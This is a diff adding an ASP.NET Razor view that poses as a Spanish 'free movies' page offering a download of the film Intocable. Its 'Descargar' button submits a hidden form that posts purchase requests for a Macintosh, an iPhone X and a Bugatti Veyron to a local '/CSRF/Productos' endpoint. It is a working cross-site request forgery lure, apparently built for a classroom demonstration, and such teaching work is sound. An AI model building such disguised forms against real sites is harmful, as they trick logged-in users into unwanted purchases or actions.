@@ -1,0 +1,21 @@
+﻿@{
+        ViewBag.Title = "Home Page";
+}
+
+<div class="jumbotron">
+    <h1>PELIS GRATIS</h1>
+    <img src="~/Images/1.png" style="width: 120px; height: 120px" />
+    <p>¿Desea descargar la película Intocable?</p>
+    <form method="post"
+          action="http://localhost:54051/CSRF/Productos">
+        <input type="hidden" name="producto"
+               value="Macintosh" />
+        <input type="hidden" name="producto"
+               value="IPhone X" />
+        <input type="hidden" name="producto"
+               value="Bugatti Veyron" />
+        <button type="submit">
+            Descargar
+        </button>
+    </form>
+</div>
